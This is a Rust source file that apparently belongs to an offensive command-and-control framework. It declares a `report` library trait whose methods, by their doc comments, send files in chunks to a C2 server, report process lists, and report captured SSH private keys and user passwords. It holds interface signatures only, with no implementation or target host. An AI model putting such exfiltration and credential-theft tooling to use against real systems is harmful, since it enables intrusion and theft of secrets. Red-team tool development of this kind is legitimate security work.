extern crate alloc;
use alloc::collections::BTreeMap;
use alloc::string::String;
use alloc::vec::Vec;
use eldritch_core::Value;
use eldritch_macros::{eldritch_library, eldritch_method};

#[cfg(feature = "fake_bindings")]
pub mod fake;

#[cfg(feature = "stdlib")]
pub mod std;

#[eldritch_library("report")]
/// The `report` library handles structured data reporting to the C2 server.
///
/// It allows you to:
/// - Exfiltrate files (in chunks).
/// - Report process snapshots.
/// - Report captured credentials (passwords, SSH keys).
pub trait ReportLibrary {
    #[eldritch_method]
    /// Reports (exfiltrates) a file from the host to the C2 server.
    ///
    /// The file is sent asynchronously in chunks.
    ///
    /// **Parameters**
    /// - `path` (`str`): The path of the file to exfiltrate.
    ///
    /// **Returns**
    /// - `None`
    ///
    /// **Errors**
    /// - Returns an error string if the file cannot be read or queued for reporting.
    fn file(&self, path: String) -> Result<(), String>;

    #[eldritch_method]
    /// Reports a snapshot of running processes.
    ///
    /// This updates the process list view in the C2 UI.
    ///
    /// **Parameters**
    /// - `list` (`List<Dict>`): The list of process dictionaries (typically from `process.list()`).
    ///
    /// **Returns**
    /// - `None`
    fn process_list(&self, list: Vec<BTreeMap<String, Value>>) -> Result<(), String>;

    #[eldritch_method]
    /// Reports a captured SSH private key.
    ///
    /// **Parameters**
    /// - `username` (`str`): The associated username.
    /// - `key` (`str`): The SSH key content.
    ///
    /// **Returns**
    /// - `None`
    fn ssh_key(&self, username: String, key: String) -> Result<(), String>;

    #[eldritch_method]
    /// Reports a captured user password.
    ///
    /// **Parameters**
    /// - `username` (`str`): The username.
    /// - `password` (`str`): The password.
    ///
    /// **Returns**
    /// - `None`
    fn user_password(&self, username: String, password: String) -> Result<(), String>;
}
